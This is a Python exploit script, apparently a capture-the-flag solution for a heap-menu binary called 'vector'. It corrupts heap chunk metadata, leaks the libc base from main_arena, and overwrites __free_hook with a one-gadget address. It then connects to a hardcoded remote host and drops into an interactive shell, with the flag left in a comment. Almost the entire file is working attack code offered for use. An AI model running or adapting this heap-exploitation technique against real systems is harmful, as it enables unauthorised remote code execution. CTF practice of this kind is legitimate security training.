#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './vector'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'34.97.74.235', 'port':30001})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    vec = Vector(conn)

    vec.new(0)
    vec.new(1)
    vec.new(2)
    vec.new(3)

    for _ in range(0x16):
        vec.push(0, 0)
    vec.push(0, 0x21)
    vec.push(0, 0x04)
    for _ in range(0x6):
        vec.push(0, 0)
    vec.push(0, 0xff)
    vec.push(0, 0x4)
    vec.push(0, 0xff)
    vec.push(0, 0x4)
    for _ in range(0x4):
        vec.push(0, 0)

    vec.set(1, 0x420-0x8c, 0x21)
    vec.set(1, 0x440-0x8c, 0x21)

    vec.push(1, 0)

    addr_libc_mainarena = 0
    for i in range(6):
        addr_libc_mainarena += vec.get(0, 0x20+i-4) << (i*8)
    addr_libc_mainarena -= 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    vec.set(1, 0x18-0x4, 0x21)
    vec.set(1, 0x20-0x4, 0x01)
    vec.set(1, 0x38-0x4, 0x31)
    vec.set(1, 0x40-0x4, 0x01)

    vec.push(2, 0)
    for i in range(6):
        vec.set(1, 0x20+i-4, ((addr_libc_free_hook-4) >> (i*8)) & 0xff)

    vec.push(3, 0)
    vec.set(1, 0x40-0x4, 0x08)
    vec.set(1, 0x42-0x4, 0x08)
    for i in range(6):
        vec.set(3, i, ((libc.address + 0x4f322) >> (i*8)) & 0xff)

    vec.push(3, 0)
    
class Vector:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def new(self, name):
        self.sendlineafter('> ', '1')
        self.sendlineafter('name: ', str(name))

    def push(self, name, value):
        self.sendlineafter('> ', '3')
        self.sendlineafter('name: ', str(name))
        self.sendlineafter('value: ', str(value))

    def set(self, name, index, value):
        self.sendlineafter('> ', '4')
        self.sendlineafter('name: ', str(name))
        self.sendlineafter('index: ', str(index))
        self.sendlineafter('value: ', str(value))

    def get(self, name, index):
        self.sendlineafter('> ', '5')
        self.sendlineafter('name: ', str(name))
        self.sendlineafter('index: ', str(index))
        self.recvuntil('val: ')
        return u(p(int(self.recvuntil('\n', drop=True)))) & 0xff

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    # TSGCTF{adding_an_unsigned_value_is_not_monotonically_increasing}
    
#==========
